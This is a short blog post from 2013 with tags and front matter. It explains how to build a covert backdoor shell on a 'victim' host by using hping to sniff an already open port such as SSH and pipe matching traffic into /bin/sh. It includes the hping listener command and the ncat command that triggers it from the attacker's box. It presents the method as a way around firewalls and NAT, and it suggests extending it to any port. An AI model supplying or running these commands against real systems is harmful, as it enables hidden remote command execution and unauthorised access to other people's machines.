---
date: '2013-05-11T10:00:00+10:00'
title: 'Create hidden reverse shell by reusing an open port'
draft: false
tags: ["security", "hacking", "networking", "reverse shell"]
---

You want to create a reverse shell and your box seats behind a NAT, a proxy, or a firewall and you don't have enough access to modify the settings on those edge devises to allow an incoming port. I am assuming that at least you have one open and publicly routable port on your box e.g. SSH, HTTP, etc.

Good news is you can reuse that open port to create a reverse shell.

## Create a reverse shell by reusing an open port

Lets assume you want to create a reverse shell from box A to box B. Box B is your host behind NAT and box A is your victim host.

Download and install hping:

On A run the following command:

```bash
hping -I eth0 -p 22 --listen PATTERN | /bin/sh
```

The above command puts hping in a listen/sniff mode on eth0 interface and port 22 that is an open and publicly routable port. It listens to specific PATTERN in the incoming data. This is important to distinguish between the data that you are interested to capture and other data that come to port 22. PATTERN is a signature payload that hping looks for inside that TCP data payload. You can use any keyword here like 'mySecret', '[root@victim root]'.

On B run the following command:

```bash
echo "PATTERN;" | ncat -v BOXA-IP 22
```

Remember to replace PATTERN to your signature e.g. 'mySecret'. Now you should have nice reverse shell.

## How does this work?

hping intercepts the traffic coming to your selected port. Using pipe we send the incoming traffic to bash. Cool right? Now imagine what else you can do? Here is a tip. hping sniffs the traffic at the interface level (like tcpdump) so it means we can use it to listen to ANY incoming traffic on ANY port! I leave this as a challenge for your to find a way.

## Reference

- [hping by iphelix](http://www.thesprawl.org/research/hping/)
- [HPING tutorial by xxradar](http://www.radarhack.com/dir/papers/hping2_v1.5.pdf)
- [Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
